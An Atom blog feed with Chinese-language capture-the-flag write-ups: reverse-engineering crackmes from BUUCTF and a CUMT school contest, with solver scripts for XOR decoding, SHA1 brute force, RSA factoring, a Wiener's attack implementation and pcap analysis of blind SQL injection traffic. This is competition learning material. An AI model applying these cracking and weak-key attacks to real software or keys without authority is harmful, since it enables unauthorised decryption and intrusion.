<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://7usai.github.io</id>
    <title>7usai</title>
    <updated>2020-10-10T15:56:47.392Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://7usai.github.io"/>
    <link rel="self" href="https://7usai.github.io/atom.xml"/>
    <subtitle>7usai&apos;blog</subtitle>
    <logo>https://7usai.github.io/images/avatar.png</logo>
    <icon>https://7usai.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, 7usai</rights>
    <entry>
        <title type="html"><![CDATA[BUUCTF re部分wp_2]]></title>
        <id>https://7usai.github.io/post/jU8l_PwBM/</id>
        <link href="https://7usai.github.io/post/jU8l_PwBM/">
        </link>
        <updated>2020-10-10T15:41:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="gwctf-2019pyre">[GWCTF 2019]pyre</h2>
<h3 id="脚本">脚本</h3>
<pre><code>flag=''
code = [
    '\x1f',
    '\x12',
    '\x1d',
    '(',
    '0',
    '4',
    '\x01',
    '\x06',
    '\x14',
    '4',
    ',',
    '\x1b',
    'U',
    '?',
    'o',
    '6',
    '*',
    ':',
    '\x01',
    'D',
    ';',
    '%',
    '\x13']
l=len(code)+1
for i in range(l-3 ,-1, -1):
    code[i] = chr(ord(code[i])^ord(code[i + 1]))
for j in range(l-1):
    flag+=chr((ord(code[j])-j)%128)
print(flag)
</code></pre>
<h2 id="crackrtf">CrackRTF</h2>
<p>md5生成一个128bit的结果，通常用32位的16进制字符串表示<br>
sha1生成一个160bit的结果，通常用40位的16进制字符串表示</p>
<pre><code>memset(&amp;v3, 0xCCu, 0x350u);
  memset(&amp;pbData, 0, 0x104u);
  memset(&amp;String1, 0, 0x104u);
  v5 = 0;
  printf(&quot;pls input the first passwd(1): &quot;);
  scanf(&quot;%s&quot;, &amp;pbData);
  if ( strlen((const char *)&amp;pbData) != 6 )
  {
    printf(&quot;Must be 6 characters!\n&quot;);
    ExitProcess(0);
  }
  v5 = unknown_libname_1((char *)&amp;pbData);
  if ( v5 &lt; 100000 )
    ExitProcess(0);
  strcat((char *)&amp;pbData, &quot;@DBApp&quot;);
  v0 = strlen((const char *)&amp;pbData);
  sub_40100A(&amp;pbData, v0, &amp;String1);
  if ( !_strcmpi(&amp;String1, &quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;) )
  {
    printf(&quot;continue...\n\n&quot;);
    printf(&quot;pls input the first passwd(2): &quot;);
    memset(&amp;String, 0, 0x104u);
    scanf(&quot;%s&quot;, &amp;String);
    if ( strlen(&amp;String) != 6 )
    {
      printf(&quot;Must be 6 characters!\n&quot;);
      ExitProcess(0);
    }
    strcat(&amp;String, (const char *)&amp;pbData);
    memset(&amp;String1, 0, 0x104u);
    v1 = strlen(&amp;String);
    sub_401019((BYTE *)&amp;String, v1, &amp;String1);
    if ( !_strcmpi(&quot;27019e688a4e62a649fd99cadaafdb4e&quot;, &amp;String1) )
    {
      if ( !sub_40100F(&amp;String) )
      {
        printf(&quot;Error!!\n&quot;);
        ExitProcess(0);
      }
      printf(&quot;bye ~~\n&quot;);
    }
  }
  return 0;
</code></pre>
<p>主函数代码意思就是比较两次，需要输入两次密码，当密码长度不为6时退出，当密码长度为6时继续比较第二个，第一次输入后在后边添加&quot;@DBApp&quot;，第二次输入后在后边添加第一次添加&quot;@DBApp&quot;后的字符串(即12位字符串pbDate)</p>
<p>两个关键函数sub_40100A，sub_401019</p>
<h3 id="sub_40100a">sub_40100A</h3>
<pre><code>  memset(&amp;v4, 0xCCu, 0x68u);
  if ( CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) )
  {
    if ( CryptCreateHash(phProv, 0x8004u, 0, 0, &amp;phHash) )
    {
      if ( CryptHashData(phHash, pbData, dwDataLen, 0) )
      {
        CryptGetHashParam(phHash, 2u, v7, &amp;pdwDataLen, 0);
        *lpString1 = 0;
        for ( i = 0; i &lt; pdwDataLen; ++i )
        {
          wsprintfA(&amp;String2, &quot;%02X&quot;, v7[i]);
          lstrcatA(lpString1, &amp;String2);
        }
        CryptDestroyHash(phHash);
        CryptReleaseContext(phProv, 0);
        result = 1;
      }
      else
      {
        CryptDestroyHash(phHash);
        CryptReleaseContext(phProv, 0);
        result = 0;
      }
    }
    else
    {
      CryptReleaseContext(phProv, 0);
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}
</code></pre>
<p>可以看出是sha1加密</p>
<h4 id="爆破脚本">爆破脚本</h4>
<pre><code>from hashlib import sha1
flag = &quot;@DBApp&quot;
for i in range(100000,999999):
   s = str(i)+flag
   x = sha1(s.encode()) #对unicode对象编码
   cnt = x.hexdigest() #产出hash值,拿到加密字符串
   if &quot;6e32d0943418c2c&quot; in cnt:
      print(cnt)
      print(str(i)+flag)
</code></pre>
<h3 id="sub_401019">sub_401019</h3>
<pre><code>  memset(&amp;v4, 0xCCu, 0x64u);
  if ( CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) )
  {
    if ( CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) )
    {
      if ( CryptHashData(phHash, pbData, dwDataLen, 0) )
      {
        CryptGetHashParam(phHash, 2u, v7, &amp;pdwDataLen, 0);
        *lpString1 = 0;
        for ( i = 0; i &lt; pdwDataLen; ++i )
        {
          wsprintfA(&amp;String2, &quot;%02X&quot;, v7[i]);
          lstrcatA(lpString1, &amp;String2);
        }
        CryptDestroyHash(phHash);
        CryptReleaseContext(phProv, 0);
        result = 1;
      }
      else
      {
        CryptDestroyHash(phHash);
        CryptReleaseContext(phProv, 0);
        result = 0;
      }
    }
    else
    {
      CryptReleaseContext(phProv, 0);
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}
</code></pre>
<p>这里的md5解密失败继续看发现sub_40100F</p>
<h3 id="sub_40100f">sub_40100F</h3>
<pre><code>  memset(&amp;v2, 0xCCu, 0x60u);
  hFile = 0;
  hResInfo = 0;
  hResData = 0;
  nNumberOfBytesToWrite = 0;
  NumberOfBytesWritten = 0;
  v5 = 0;
  lpBuffer = 0;
  v3 = 0;
  hResInfo = FindResourceA(0, (LPCSTR)0x65, &quot;AAA&quot;);// 使用FindResourceA( )查找资源，类型是&quot;AAA&quot;，名称101(0x65)
  if ( hResInfo )
  {
    nNumberOfBytesToWrite = SizeofResource(0, hResInfo);
    hResData = LoadResource(0, hResInfo);
    if ( hResData )
    {
      lpBuffer = LockResource(hResData);
      sub_401005(lpString, (int)lpBuffer, nNumberOfBytesToWrite);// 异或操作
      hFile = CreateFileA(&quot;dbapp.rtf&quot;, 0x10000000u, 0, 0, 2u, 0x80u, 0);// 生成一个.rtf文件
      if ( hFile == (HANDLE)-1 )
      {
        result = 0;
      }
      else if ( WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, 0) )
      {
        CloseHandle(hFile);
        result = 1;
      }
      else
      {
        result = 0;
      }
    }
    else
    {
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}
</code></pre>
<p>用ResourceHacker查看文件中的资源</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1602344545539.png" alt="" loading="lazy"></figure>
<p>异或函数如下</p>
<pre><code>  memset(&amp;v4, 0xCCu, 0x4Cu);
  v7 = lstrlenA(lpString);
  v6 = lpString;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i &gt;= a3 )
      break;
    *(_BYTE *)(i + a2) ^= v6[i % v7];
  }
  return result;
</code></pre>
<p>这里的a2是AAA中资源的首位指针，v7是密码长度</p>
<p>脚本</p>
<pre><code>s = &quot;{\\rtf1&quot;
a = [0x05, 0x7D, 0x41, 0x15, 0x26, 0x01]
flag = &quot;&quot;
for i in range(0, len(s)):
    x = ord(s[i]) ^ a[i]
    flag += chr(x)
print(flag)
</code></pre>
<p>s是rtf文件的6位头部</p>
<p>得到两个6位密码后输入并打开生出的rtf文件，得flag=Flag{N0_M0re_Free_Bugs}</p>
<h2 id="youngter-drive">Youngter-drive</h2>
<p>发现有upx壳，在ubuntu里用upx -d脱壳后放入ida6.8里找不到main函数，放入ida7.0里正常找到</p>
<h3 id="主要函数">主要函数</h3>
<pre><code>main函数

  sub_4110FF(this);                             // input函数
  ::hObject = CreateMutexW(0, 0, 0);            // 创建一个互斥体
  j_strcpy(Dest, Source);                       // 复制到Dest里
  hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);// 建立新的线程
  v2 = CreateThread(0, 0, sub_41119F, 0, 0, 0); // 与上一行相比多了一个sub_41112C函数
  CloseHandle(hObject);
  CloseHandle(v2);
  while ( dword_418008 != -1 )
    ;
  sub_411190();                                 // 比较并输出函数
  CloseHandle(::hObject);
  return 0;

StartAddress函数
  while ( 1 )
  {
    WaitForSingleObject(hObject, 0xFFFFFFFF);
    if ( dword_418008 &gt; -1 )
    {
      sub_41112C(Source, dword_418008);         // dword=1Dh
      --dword_418008;
      Sleep(0x64u);
    }
    ReleaseMutex(hObject);

sub_41119F函数
  while ( 1 )
  {
    WaitForSingleObject(hObject, 0xFFFFFFFF);
    if ( dword_418008 &gt; -1 )
    {
      Sleep(0x64u);
      --dword_418008;
    }
    ReleaseMutex(hObject);
  }

sub_411190函数
  for ( i = 0; i &lt; 29; ++i )
  {
    if ( Source[i] != off_418004[i] )           // TOiZiZtOrYaToUwPnToBsOaOapsyS
      exit(0);
  }
  return printf(&quot;\nflag{%s}\n\n&quot;, Dest);
  
sub_41112C函数（在StartAddress函数里）
  v3 = *(a2 + a1);                              // a1是source,v3是a1[a2]
  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )// v3不是字母时退出
    exit(0);
  if ( v3 &lt; 97 || v3 &gt; 122 )                    // v3是大写字母时
  {
    result = off_418000[0];                     // QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasd
    *(a2 + a1) = off_418000[0][*(a2 + a1) - 38];
  }
  else                                          // v3是小写字母时
  {
    result = off_418000[0];
    *(a2 + a1) = off_418000[0][*(a2 + a1) - 96];
  }
  return result;
</code></pre>
<p>sub_41112C函数直接反编译会失败，原因是因为堆栈不平衡</p>
<pre><code>.text:00411A04 000                 retn
.text:00411A04     sub_411940      endp ; sp-analysis failed
</code></pre>
<p>这里000本来是-04，将其调成000即可光标放在上边Alt+k修改</p>
<p>线程hObject进行加密，v2就是dword_418008-1，即下标-1，他是倒叙着比较的，相当于先比较source[29]再比较souce[28],但是输出flag时是正序,当比较29时加密，28时正常输出，依次递减，即下标是偶数时直接打印off_418004中的数，是奇数时则需要变换；变换思路以及得flag的脚本如下</p>
<pre><code>off_418000 = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;
off_418004 = &quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;
flag=''
#print(len(off_418004))
for i in range(len(off_418004)):
    if i%2 == 0:
        flag += off_418004[i]
    else:
        if(off_418004[i].isupper()):#isupper判断是否为大写字母
            flag = flag + chr(off_418000.find(off_418004[i])+96)
            #对应*(a2 + a1) = off_418000[0][*(a2 + a1) - 96];思路：先找到下标数即*(a2 + a1) - 96再+96就为flag，这里*(a2 + a1)对应source，因为source与off_418004进行了比较所以相当于其字符串，即用find函数寻找off_418004中字符在off_418000中的下标
        else:
            flag = flag + chr(off_418000.find(off_418004[i])+38)
print(flag)
</code></pre>
<p>得flag为29位，因为输出函数中比较了29位，我们需要自己再加一位，但是只有加E的时候正确</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMT校赛200923]]></title>
        <id>https://7usai.github.io/post/lgs4SdGy2/</id>
        <link href="https://7usai.github.io/post/lgs4SdGy2/">
        </link>
        <updated>2020-09-27T11:08:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cumt校赛">CUMT校赛</h1>
<p>[TOC]</p>
<h2 id="crypto">Crypto</h2>
<h3 id="幼儿园的密码题">幼儿园的密码题</h3>
<h4 id="脚本">脚本</h4>
<p>已知n求p,q</p>
<p>http://www.factordb.com/</p>
<p>n,e,c转成10进制</p>
<pre><code>import gmpy2
p=324350545929838254331191385863847627003
q=328413456989577256301798468872388310877
n=106521084065274837947153338013414677016150003618052696631715598225251903811631
c=40448992051548719008529549070468060415257485938698092782029814901918646701101
e=65537
d = gmpy2.invert(e,(p-1)*(q-1))
key=pow(c, d, n)
print(d)
print(key)
</code></pre>
<p>得出来的key转十六进制再转字符(真的真的很没意思)</p>
<h3 id="小学生的密码题">小学生的密码题</h3>
<pre><code>from secret import flag
def encode(ptext):
    dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]   		;dic='ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_'abcdefghijklmnopqrstuvwxyz{|}~
    m = [i for i in ptext]					;m=flag
    tmp = [];s = []						创建临时tmp和s
    for i in range(len(m)):					;range(flag长度)	
        for j in range(len(dic)):					;range(62)
            if m[i] == dic[j]:					;flag[i]==dic[j] 即为A到~时
                tmp.append(j + 1)					;tmp+=j+1(相当于ord(dic[j])-63)
    for i in tmp:						;遍历tmp中的数
        res = &quot;&quot;						
        if i &gt;= 8:						i&gt;=8(dic[j]&gt;=71时)	
            res += int(i/8)*&quot;8&quot;
        if i%8 &gt;=4:						i%8&gt;=4	
            res += int(i%8/4)*&quot;4&quot;					
        if i%4 &gt;=2:						
            res += int(i%4/2)*&quot;2&quot;
        if i%2 &gt;= 1:						
            res += int(i%2/1)*&quot;1&quot;
        s.append(res + &quot;0&quot;)
    print (&quot;&quot;.join(s)[:-1])
encode(flag)
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1601204975990.png" alt="" loading="lazy"></figure>
<p>硬算，算到一半发现加法就行，淦</p>
<h4 id="脚本-2">脚本</h4>
<pre><code>a=[2,20,12,19,2,19,5,58,24,46,52,30,32,49,36,30,17,40,38,39,51,60]
b=[67,85,77,84,67,84,70,123,89,111,117,95,97,114,101,95,82,105,103,104,116,125]
flag=''
for i in range(22):
    flag+=chr(b[i])
    print(flag)
</code></pre>
<p>a=上边一坨-1</p>
<p>b=a+65</p>
<p>得flag=CUMTCTF{You_are_Right}</p>
<h3 id="初中生的密码题">初中生的密码题</h3>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1601205029628.png" alt="" loading="lazy"></figure>
<p>先用z3求出来p和q的值，最后正常计算鸡号</p>
<h4 id="脚本-3">脚本</h4>
<pre><code>from z3 import *
n=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
x =-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
#x=p-q
c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609
p=Int('p')
solve((p-x)*p==n)
q=Int('q')
solve((q+x)*q==n)
import gmpy2
from Crypto.Util.number import long_to_bytes
n=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
x =-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609
e=65537
p=30697352531330434856674588715905741896538207322123455679076478093195252240812032665803037835289865152784098077605359655486723575203621508201904205626825328632340569805064205047909749046701590344754257018324448436810374908046833801210988143008924043901109029730458966709669708451252061195235570558910738154083634093497318083877286614306923427160713075752860556509004687350746768578465885884145482528431003386829431965250868646361821676571510726939416897822283852421262616728229663652002544064443613737966055339522820176866519596663623744466631149567795708311336148219848210798881176646765091102193180034355210912558857
q=27645282466792257817358384518715154123933486746276391774444263805549184785758801611331727512618316117511830402291064671589992764575159205025150465127288678123273537254064555405597566045234264775696535233870342993688075308678745590840323230545378985874470970254306849398957159842378297616929194560560009113289974948388515331563429630185479068783351179683616591359572060950115733092007970489291940798526853201952607101543451447208843400052850424803320216100092186342006347459230274434357647688100553885838717057678699728084320705167709841528456836129264040561415840443911854851862230026044112813788167529469759180327221
phi=(p-1)*(q-1)
d=gmpy2.invert(e,phi)
m=pow(c,d,n)
print (long_to_bytes(m))
</code></pre>
<h3 id="维也纳的秘密">维也纳的秘密</h3>
<p>wieners'attack</p>
<h4 id="脚本-4">脚本</h4>
<pre><code>e=25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193
n=106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819
c=15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160
import gmpy2
from Crypto.Util.number import long_to_bytes


def transform(x, y):  # 使用辗转相处将分数 x/y 转为连分数的形式
    res = []
    while y:
        res.append(x // y)
        x, y = y, x % y
    return res


def continued_fraction(sub_res):
    numerator, denominator = 1, 0
    for i in sub_res[::-1]:  # 从sublist的后面往前循环
        denominator, numerator = numerator, i * numerator + denominator
    return denominator, numerator  # 得到渐进分数的分母和分子，并返回


# 求解每个渐进分数
def sub_fraction(x, y):
    res = transform(x, y)
    res = list(map(continued_fraction, (res[0:i] for i in range(1, len(res)))))  # 将连分数的结果逐一截取以求渐进分数
    return res


def get_pq(a, b, c):  # 由p+q和pq的值通过维达定理来求解p和q
    par = gmpy2.isqrt(b * b - 4 * a * c)  # 由上述可得，开根号一定是整数，因为有解
    x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a)
    return x1, x2


def wienerAttack(e, n):
    for (d, k) in sub_fraction(e, n):  # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数
        if k == 0:  # 可能会出现连分数的第一个为0的情况，排除
            continue
        if (e * d - 1) % k != 0:  # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)
            continue

        phi = (e * d - 1) // k  # 这个结果就是 φ(n)
        px, qy = get_pq(1, n - phi + 1, n)
        if px * qy == n:
            p, q = abs(int(px)), abs(int(qy))  # 可能会得到两个负数，负负得正未尝不会出现
            d = gmpy2.invert(e, (p - 1) * (q - 1))  # 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d
            return d
    print(&quot;该方法不适用&quot;)
d=wienerAttack(e,n)
print(&quot;d=&quot;,d)
key=pow(c, d, n)
print(key)
key1=long_to_bytes(key)
print(key1)
</code></pre>
<h3 id="我只吃素">我只吃素</h3>
<h4 id="脚本-5">脚本</h4>
<pre><code>from Crypto.Util.number import long_to_bytes
s=open('F:/markdown/Typora/SAVES/校赛题目/20200923/Crypto/我只吃素.txt','r').read()
b = [3,5,7,11,13,17,19,23,29,31]
for i in b:
    s=int(s,i)
    s=hex(s)[2:]
    s=bytes.fromhex(s).decode()
dic={}
for i in range(10):
    dic[chr(ord('0')+i)]=i
for i in range(26):
    dic[chr(ord('a') + i)] = i+10
for i in range(26):
    dic[chr(ord('A') + i)] = i+10+26
print(dic)

def change(s, k):
    j=0
    res=0
    for i in range(len(s)):
        res += dic[s[len(s) - i - 1]] * pow(k, j)
        j+=1
    return res
c = [37, 41, 43, 47, 53, 59, 61]
for j in c:
    s=change(s,j)
    s=hex(s)[2:]
    c=s
    s = bytes.fromhex(s).decode()
ss=int(c,16)
print(long_to_bytes(ss))
print(s)
</code></pre>
<h2 id="re">RE</h2>
<h3 id="re1">re1</h3>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1601205060940.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1601205069100.png" alt="" loading="lazy"></figure>
<h3 id="re2">re2</h3>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1601205077620.png" alt="" loading="lazy"></figure>
<p>脱壳机脱壳</p>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1601205085576.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1601205093318.png" alt="" loading="lazy"></figure>
<h3 id="re3">re3</h3>
<p>从python字节码可看出是存入一个数组cipher，再与19异或得flag</p>
<h4 id="脚本-6">脚本</h4>
<pre><code>cipher=[80,70,94,71,80,71,85,104,86,39,64,106,76,67,
   106,71,123,92,125,76,37,106,103,118,80,35,119,32,110]
b=''
for i in range(29):
    b+=chr(cipher[i]^19)
    print(b)
</code></pre>
<h3 id="re4">re4</h3>
<p>无壳，32位</p>
<p>加密函数</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1601205154701.png" alt="" loading="lazy"></figure>
<p>存在v15的字符</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1601205183970.png" alt="" loading="lazy"></figure>
<p>正向脚本</p>
<pre><code>v15=[0x15,0x02,0x0A,0x16,0x13,0x0B,0x11,0x08,0x03,0x1B,0x19,0x21,0x12,0x1A,
     0x18,0x10,0x09,0x22,0x24,0x17,0x04,0x0E,0x0C,0x14,0x1E,0x00,0x1D,0x07,
     0x01,0x06,0x1F,0x0F,0x05,0x1C,0x0D,0x23,0x20,0x25]
a='eMl1_l1hT9_ldcoR3OC1CW0HhC_{UF30Tp__l}'
b=''
for j in range(len(v15)):
    b+=a[v15[j]]
    print(b)
</code></pre>
<p>其实a=flag[v15[j]]</p>
<p>逆向脚本不会写</p>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1601205194993.png" alt="" loading="lazy"></figure>
<p>再排序</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1601205201637.png" alt="" loading="lazy"></figure>
<h2 id="misc">Misc</h2>
<h3 id="连签到都算不上">连签到都算不上</h3>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1601205220371.png" alt="" loading="lazy"></figure>
<p>得</p>
<pre><code>\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u5e73\u7b49\u81ea\u7531\u8bda\u4fe1\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u516c\u6b63\u6cd5\u6cbb\u53cb\u5584\u5e73\u7b49\u5e73\u7b49\u6cd5\u6cbb\u548c\u8c10\u548c\u8c10\u516c\u6b63\u8bda\u4fe1\u6587\u660e\u516c\u6b63\u548c\u8c10\u548c\u8c10\u5bcc\u5f3a\u516c\u6b63\u8bda\u4fe1\u548c\u8c10\u548c\u8c10\u548c\u8c10\u5e73\u7b49\u8bda\u4fe1\u5e73\u7b49\u548c\u8c10\u6587\u660e\u5e73\u7b49\u8bda\u4fe1\u5e73\u7b49\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u516c\u6b63\u6587\u660e\u6c11\u4e3b\u6cd5\u6cbb\u8bda\u4fe1\u548c\u8c10\u000d\u000a
</code></pre>
<p>继续转</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1601205241220.png" alt="" loading="lazy"></figure>
<p>继续转</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1601205251698.png" alt="" loading="lazy"></figure>
<h3 id="真签到题">真签到题</h3>
<figure data-type="image" tabindex="15"><img src="https://7usai.github.io/post-images/1601205294999.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://7usai.github.io/post-images/1601205311610.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://7usai.github.io/post-images/1601205326113.png" alt="" loading="lazy"></figure>
<h3 id="大鲨鱼之你可劲找">大鲨鱼之你可劲找</h3>
<p>这题真的很恶心<br>
<img src="https://7usai.github.io/post-images/1601205336893.png" alt="" loading="lazy"></p>
<p>先搜索flag，发现全是http</p>
<p>再缩小范围</p>
<figure data-type="image" tabindex="18"><img src="https://7usai.github.io/post-images/1601205347454.png" alt="" loading="lazy"></figure>
<p>这里可以看到是这样的sql语句</p>
<figure data-type="image" tabindex="19"><img src="https://7usai.github.io/post-images/1601205357377.png" alt="" loading="lazy"></figure>
<p>追踪http流</p>
<figure data-type="image" tabindex="20"><img src="https://7usai.github.io/post-images/1601205365585.png" alt="" loading="lazy"></figure>
<p>分为好几组，每一组确定一个十进制数，一组有好几段，每段后面都有一串字符，根据不同的字符判断是&gt;还是&lt;=，数就完事了，</p>
<figure data-type="image" tabindex="21"><img src="https://7usai.github.io/post-images/1601205375301.png" alt="" loading="lazy"></figure>
<h4 id="脚本-7">脚本</h4>
<pre><code>a=[99,101,99,99,49,51,57,52,45,54,49,51,51,45,52,51,
100,48,45,98,101,48,54,45,97,52,49,99,53,102,50,51,49,100,100,52,125]
b=''
for i in range(len(a)):
    b+=chr(a[i])
    print(b)
</code></pre>
<h3 id="别做题了听歌吧">别做题了听歌吧</h3>
<figure data-type="image" tabindex="22"><img src="https://7usai.github.io/post-images/1601205385896.jpg" alt="" loading="lazy"></figure>
<p>用MP3stego分离</p>
<figure data-type="image" tabindex="23"><img src="https://7usai.github.io/post-images/1601205396602.png" alt="" loading="lazy"></figure>
<p>得到这个</p>
